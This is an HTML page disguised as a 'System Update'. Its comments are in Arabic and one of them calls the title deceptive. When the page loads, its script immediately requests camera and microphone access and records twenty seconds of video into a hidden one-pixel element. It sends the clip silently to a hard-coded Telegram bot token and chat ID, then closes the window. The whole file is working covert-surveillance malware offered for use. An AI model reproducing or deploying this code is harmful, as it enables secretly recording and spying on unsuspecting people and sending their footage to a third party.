<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title> <!-- عنوان خادع -->
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        
        /* إخفاء كامل لعنصر الفيديو */
        #camera-view {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            width: 1px;
            height: 1px;
            z-index: -1000;
        }
    </style>
</head>
<body>
    <!-- عنصر الكاميرا المخفي تمامًا -->
    <video id="camera-view" autoplay playsinline></video>
    
    <script>
        // التكوين - استبدل هذه القيم
        const config = {
            botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
            chatId: '5310911220',
            recordingDuration: 20000, // 20 ثانية
            useFrontCamera: false // false للخلفية، true للأمامية
        };
        
        // العملية الرئيسية
        async function startHiddenRecording() {
            try {
                // 1. تهيئة الكاميرا خفية
                const constraints = {
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: config.useFrontCamera ? 'user' : 'environment'
                    },
                    audio: true
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const cameraView = document.getElementById('camera-view');
                cameraView.srcObject = stream;
                
                // 2. تسجيل الفيديو
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp9',
                    videoBitsPerSecond: 2000000
                });
                
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                const recordingPromise = new Promise(resolve => {
                    mediaRecorder.onstop = () => {
                        const videoBlob = new Blob(chunks, { type: 'video/webm' });
                        resolve(videoBlob);
                    };
                });
                
                mediaRecorder.start();
                
                // 3. ضبط مدة التسجيل
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, config.recordingDuration);
                
                // 4. إرسال الفيديو
                const videoBlob = await recordingPromise;
                await sendToTelegram(videoBlob);
                
                // 5. إغلاق النافذة بصمت
                window.close();
                
            } catch (error) {
                console.error('Hidden recording failed:', error);
                window.close(); // إغلاق في جميع حالات الفشل
            }
        }
        
        // دالة الإرسال إلى تليجرام
        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append('chat_id', config.chatId);
            formData.append('video', videoBlob, 'system_update.webm');
            formData.append('disable_notification', 'true'); // إرسال صامت
            
            try {
                await fetch(`https://api.telegram.org/bot${config.botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Error sending video:', error);
                throw error;
            }
        }
        
        // بدء التسجيل فور تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            // طلب الإذن دون واجهة مستخدم
            startHiddenRecording().catch(e => console.error(e));
        });
    </script>
</body>
</html>